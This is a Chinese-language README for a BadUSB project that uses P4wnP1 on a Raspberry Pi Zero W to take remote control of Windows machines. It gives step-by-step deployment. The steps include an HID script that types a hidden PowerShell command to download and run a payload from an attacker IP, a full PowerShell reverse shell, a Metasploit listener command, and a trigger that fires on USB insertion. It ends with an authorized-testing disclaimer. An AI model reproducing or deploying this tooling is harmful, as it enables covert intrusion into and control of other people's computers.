# P4WNP1 BadUSB Reverse Shell Project

基于 P4WNP1 ALOA 的 BadUSB 反向 Shell 工具，插入USB即可获取目标机器的远程控制。

## 环境要求

| 设备 | 系统 | 用途 |
|------|------|------|
| 树莓派 Zero W | P4WNP1 ALOA | BadUSB 设备 |
| 攻击机 | Kali Linux | MSF 监听 |
| 目标机 | Windows 10/11/Server | 被控端 |

---

## 快速开始

### 方式一：自动部署（推荐）

```bash
pip install paramiko
python3 deploy/deploy.py --attacker-ip 192.168.146.145
```

### 方式二：手动部署

#### Step 1: SSH 连接树莓派

```bash
ssh root@172.16.0.1
密码: toor
```

#### Step 2: 创建 HIDScripts 目录

```bash
mkdir -p /usr/local/P4wnP1/HIDScripts
```

#### Step 3: 上传 staged_shell.js

在树莓派上创建文件：

```bash
cat > /usr/local/P4wnP1/HIDScripts/staged_shell.js << 'EOF'
// ===== CONFIG =====
var LISTENER_IP = "192.168.146.145";  // 改为你的Kali IP
var HTTP_PORT = "80";
// ==================

layout("US");
typingSpeed(0,0);

press("GUI r");
delay(500);

type("powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + LISTENER_IP + ":" + HTTP_PORT + "/rev.ps1')\"");
delay(300);

press("ENTER");
EOF
```

#### Step 4: 上传 rev.ps1 到树莓派 HTTP 目录

```bash
mkdir -p /var/www/html
cat > /var/www/html/rev.ps1 << 'EOF'
$ip = "192.168.146.145"
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
$s = $c.GetStream()
$sr = New-Object System.IO.StreamReader($s)
$sw = New-Object System.IO.StreamWriter($s)
$sw.AutoFlush = $true

$si = New-Object System.Diagnostics.ProcessStartInfo("cmd.exe")
$si.RedirectStandardOutput = $true
$si.RedirectStandardInput = $true
$si.UseShellExecute = $false
$si.CreateNoWindow = $true
$p = [System.Diagnostics.Process]::Start($si)

$buf = New-Object System.Byte[] 65536

while ($c.Connected) {
    if ($s.DataAvailable) {
        $i = $s.Read($buf, 0, $buf.Length)
        $cmd = [Text.Encoding]::ASCII.GetString($buf, 0, $i)
        $p.StandardInput.WriteLine($cmd)
        Start-Sleep -Milliseconds 200
        $out = $p.StandardOutput.ReadToEnd()
        $sw.Write($out)
    }
    Start-Sleep -Milliseconds 100
}

$p.Kill()
$c.Close()
EOF
```

#### Step 5: 启动树莓派 HTTP 服务器

```bash
cd /var/www/html
python3 -m http.server 80 &
```

#### Step 6: Kali 攻击机设置

```bash
# 终端1 - MSF 监听
msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 192.168.146.145; set LPORT 4444; exploit"

# 终端2 - HTTP 服务器（如果不用树莓派的）
cd /var/www/html && python3 -m http.server 80
```

#### Step 7: P4WNP1 Web 配置触发器

1. 访问 `http://172.16.0.1:8000`
2. 点击 **TriggerActions**
3. 添加：
   - Event: `TRIGGER_USB_GADGET_CONNECTED`
   - Action: `HIDScript`
   - Script: `staged_shell`

#### Step 8: 插入 USB

插入树莓派到目标机器，等待 5-10 秒获取 shell。

---

## MSF 监听配置

```bash
# 推荐 - 基础 shell（兼容性好）
set payload windows/x64/shell_reverse_tcp

# 可选 - Meterpreter（可能断开）
set payload windows/x64/meterpreter/reverse_tcp
```

---

## 文件说明

| 文件 | 位置 | 用途 |
|------|------|------|
| `staged_shell.js` | `/usr/local/P4wnP1/HIDScripts/` | 分阶段 HID 触发脚本 |
| `direct_shell.js` | `/usr/local/P4wnP1/HIDScripts/` | 直连版 HID 触发脚本 |
| `rev.ps1` | `/var/www/html/` | PowerShell 反弹 shell |

---

## 故障排查

| 问题 | 解决方案 |
|------|----------|
| Session 立刻关闭 | 改用 `shell_reverse_tcp` |
| 404 错误 | 检查 HTTP 服务器和文件路径 |
| USB 无反应 | 检查 P4WNP1 触发器配置 |
| 连接超时 | 检查防火墙和网络连通性 |

---

## 免责声明

本项目仅供授权安全测试使用，使用者需遵守当地法律法规。
